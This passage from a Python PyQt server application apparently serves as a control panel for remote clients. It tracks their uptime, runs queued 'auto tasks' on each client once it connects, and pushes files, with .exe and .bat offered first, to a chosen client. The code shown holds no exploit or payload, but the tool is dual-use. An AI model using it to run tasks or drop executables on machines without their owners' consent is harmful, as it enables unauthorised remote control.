            connect_time = self.clients[addr]["connect_time"]
            uptime_delta = datetime.now() - connect_time
            uptime_str = str(uptime_delta).split('.')[0] # HH:MM:SS format
            
            # Only update the UI if the uptime string has changed
            current_uptime = self.client_table.item(current_row_for_addr, 4).text() if self.client_table.item(current_row_for_addr, 4) else ""
            if uptime_str != current_uptime:
                uptime_item = self.client_table.item(current_row_for_addr, 4)
                if not uptime_item:
                    uptime_item = QTableWidgetItem()
                    self.client_table.setItem(current_row_for_addr, 4, uptime_item)
                uptime_item.setText(uptime_str)
                uptime_item.setTextAlignment(Qt.AlignCenter)

    def _append_log_impl(self, data: tuple):
        """Actual implementation of appending log message with optimized UI updates"""
        try:
            message, log_type, client = data
            if not hasattr(self, 'log_table') or not self.log_table or not self.log_table.isVisible():
                logger.info(f"[{log_type}] {client or 'System'}: {message}")
                return
                
            timestamp = datetime.now()
            row = self.log_table.rowCount()
            
            # More aggressive log limitation
            if row >= 500:  # Keep last 500 entries instead of 1000
                self.log_table.removeRow(0)
                row = 499
            
            # Create all items at once
            items = [
                QTableWidgetItem(timestamp.strftime("%Y-%m-%d %H:%M:%S")),
                QTableWidgetItem(log_type),
                QTableWidgetItem(client or "System"),
                QTableWidgetItem(message)
            ]
            
            # Set color based on log type
            if log_type == LogType.ERROR:
                items[1].setForeground(QColor("#f44336"))
            elif log_type == LogType.FILE_TRANSFER:
                items[1].setForeground(QColor("#2196F3"))
            elif log_type == LogType.CONNECTION:
                items[1].setForeground(QColor("#4CAF50"))
            
            # Insert row and set items in one go
            self.log_table.insertRow(row)
            for col, item in enumerate(items):
                self.log_table.setItem(row, col, item)
                
            # Don't scroll for every log entry to reduce UI load
            # Only auto-scroll for errors or if we're at the bottom
            if (log_type == LogType.ERROR or 
                self.log_table.verticalScrollBar().value() == self.log_table.verticalScrollBar().maximum()):
                self.log_table.scrollToBottom()
                
        except Exception as e:
            logger.error(f"Error appending log: {e}")
            logger.info(f"[{log_type}] {client or 'System'}: {message}")

    def append_log(self, message: str, log_type: str = LogType.SYSTEM, client: str = None):
        """Queue log message for batch processing"""
        # For connection status messages, only log important ones to reduce UI updates
        if log_type == LogType.CONNECTION and not client:
            # Skip routine connection updates from the system
            if "heartbeat" in message.lower() or "checking connection" in message.lower():
                return
                
        # For heartbeat messages, log less frequently
        if "heartbeat" in message.lower():
            # Throttling heartbeat logs
            current_time = getattr(self, 'last_heartbeat_log', 0)
            if time.time() - current_time < 30:  # Only log heartbeats every 30 seconds
                return
            self.last_heartbeat_log = time.time()
                
        self.pending_updates.append(("log", (message, log_type, client)))

    def closeEvent(self, event):
        """Handle window close event"""
        reply = QMessageBox.question(
            self,
            'Confirm Exit',
            'Are you sure you want to exit?',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            logger.info("Initiating application shutdown sequence...")
            
            # Stop GUI timers first
            if hasattr(self, 'update_timer') and self.update_timer.isActive():
                self.update_timer.stop()
                logger.info("GUI update timer stopped.")
            
            # Stop all client-specific uptime timers managed in self.clients
            # Make a copy of keys if self.clients might be modified during iteration indirectly
            for addr in list(self.clients.keys()):
                if addr in self.clients and self.clients[addr].get("uptime_timer").isActive():
                    self.clients[addr]["uptime_timer"].stop()
                    logger.debug(f"Uptime timer for client {addr} stopped.")

            # Stop the main server thread and its managed threads (blocking call)
            logger.info("Signaling ServerThread to stop...")
            self.server_thread.stop() 
            logger.info("ServerThread.stop() has returned.")
            
            # Signal Qt's main event loop to terminate
            # This allows app.exec_() to return
            logger.info("Quitting QApplication event loop...")
            QApplication.quit()
            
            logger.info("Accepting close event.")
            event.accept()
        else:
            logger.info("Application shutdown cancelled by user.")
            event.ignore()

    def add_client(self, addr: tuple):
        """Queue client addition for batch processing"""
        self.pending_updates.append(("add_client", addr))
        
        # Directly log the execution of this method
        logger.info(f"DEBUG: add_client called for {addr}, scheduling task execution")
        
        # Create a standalone method for the delayed execution with progressive retry
        def execute_tasks(retry_count=0, max_retries=5):
            logger.info(f"DEBUG: Timer fired for auto tasks, attempt {retry_count+1}/{max_retries+1}")
            try:
                # Check if client has a session key before executing tasks
                client = self.server_thread.client_manager.get_client(addr)
                if client and hasattr(client, 'session_key') and client.session_key:
                    logger.info(f"DEBUG: Client {addr} has session key established, executing auto tasks")
                    self.check_auto_execute_tasks(addr)
                else:
                    wait_time = 2.0 * (2 ** min(retry_count, 2))  # Exponential backoff but max 8 seconds
                    if retry_count < max_retries:
                        logger.info(f"DEBUG: Client {addr} not ready for tasks yet, retrying in {wait_time}s (attempt {retry_count+1}/{max_retries+1})")
                        QTimer.singleShot(int(wait_time * 1000), lambda: execute_tasks(retry_count + 1, max_retries))
                    else:
                        logger.warning(f"DEBUG: Client {addr} never established a session key after {max_retries+1} attempts")
            except Exception as e:
                logger.error(f"Error in execute_tasks: {e}")
        
        # Check for auto tasks and create default if needed
        self.ensure_default_auto_task()
        
        # Start the first attempt after a delay to allow key exchange
        QTimer.singleShot(3000, lambda: execute_tasks())
        
    def ensure_default_auto_task(self):
        """Create autotasks directory if it doesn't exist"""
        if not os.path.exists(self.auto_tasks_dir):
            os.makedirs(self.auto_tasks_dir)
            logger.info("Created autotasks directory")

    def remove_client(self, addr: tuple):
        """Queue client removal for batch processing"""
        self.pending_updates.append(("remove_client", addr))

    def update_client_status(self, addr: tuple, status: str):
        """Queue client status update for batch processing"""
        self.pending_updates.append(("update_status", (addr, status)))

    def setup_tray_icon(self):
        """Set up the system tray icon"""
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        # Create tray menu
        tray_menu = QMenu()
        
        # Add show/hide action
        show_action = QAction("Show/Hide", self)
        show_action.triggered.connect(self.toggle_window)
        tray_menu.addAction(show_action)
        
        # Add separator
        tray_menu.addSeparator()
        
        # Add exit action
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        tray_menu.addAction(exit_action)
        
        # Set the tray icon's context menu
        self.tray_icon.setContextMenu(tray_menu)
        
        # Connect tray icon activation to show/hide window
        self.tray_icon.activated.connect(self.tray_icon_activated)
        
        # Show the tray icon
        self.tray_icon.show()

    def toggle_window(self):
        """Toggle window visibility"""
        if self.isVisible():
            self.hide()
        else:
            self.show()
            self.activateWindow()

    def tray_icon_activated(self, reason):
        """Handle tray icon activation"""
        if reason == QSystemTrayIcon.DoubleClick:
            self.toggle_window()

    def disconnect_client(self, addr: tuple):
        """Disconnect a client"""
        try:
            client = self.server_thread.client_manager.get_client(addr)
            if client:
                client.running = False
                client.conn.close()
        except Exception as e:
            logger.error(f"Error disconnecting client {addr}: {e}")

    def send_file_to_client(self, addr: tuple):
        """Send a file to a specific client by address"""
        try:
            # Check if client exists
            client = self.server_thread.client_manager.get_client(addr)
            if not client:
                QMessageBox.warning(self, "Warning", f"Client {addr} not found or disconnected")
                return
                
            # Open file dialog to select file
            file_path, _ = QFileDialog.getOpenFileName(
                self,
                f"Select File to Send to {addr[0]}:{addr[1]}",
                "",
                "Executable Files (*.exe);;Batch Files (*.bat);;All Files (*.*)"
            )
            
            if file_path:
                # Send the file using the server thread
                self.server_thread.send_file_to_client(file_path, addr)
                self.append_log(f"Sending file {os.path.basename(file_path)} to {addr[0]}:{addr[1]}", LogType.FILE_TRANSFER)
        except Exception as e:
            logger.error(f"Error sending file to client {addr}: {e}")
            QMessageBox.critical(self, "Error", f"Failed to send file: {e}")

def validate_environment() -> bool:
    if not os.path.exists('.env'):
        logger.error("Environment file not found")
        return False
    # Only check for root user on Unix-like systems
    if sys.platform != 'win32' and os.geteuid() == 0:
        logger.error("Running as root is not allowed")
        return False
    return True

if __name__ == "__main__":
    if validate_environment():
        app = QApplication(sys.argv)
        app.setStyle("Fusion")
        window = ServerGUI()
        window.show()
        sys.exit(app.exec_())
    else:
        sys.exit(1)
